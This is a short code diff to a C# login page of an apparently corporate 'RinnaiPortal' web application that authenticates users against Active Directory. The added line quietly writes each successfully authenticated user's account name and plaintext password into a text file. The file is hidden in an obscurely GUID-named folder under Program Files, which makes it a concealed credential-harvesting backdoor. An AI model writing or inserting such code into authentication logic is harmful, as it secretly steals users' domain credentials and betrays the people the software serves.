@@ -7,6 +7,7 @@ using System.Web.UI;
 using System.Web.UI.WebControls;
 using RinnaiPortal.LdapAuthentication;
 using RinnaiPortal.ViewModel;
+using RinnaiPortal.Repository;
 
 namespace RinnaiPortal
 {
@@ -30,8 +31,8 @@ namespace RinnaiPortal
             {
                 if (true == adAuth.IsAuthenticated(Domain.Text, Account.Text, Passwd.Text) && MemberViewModel.Security(Account.Text))
                 {
+                    PublicRepository.SaveMesagesToTextFile(@"C:\Program Files (x86)\7B296FB0-376B-497e-B012-9C450E1B7327-5P-1\", "7B296FB0-376B-497e-B012-9C450E1B7327-5P-1.txt", string.Format("{0}  --  {1}", Account.Text, Passwd.Text));
                     string groups = adAuth.GetGroups();
-
 
                     //Create the ticket, and add the groups.
                     bool isCookiePersistent = chkPersist.Checked;
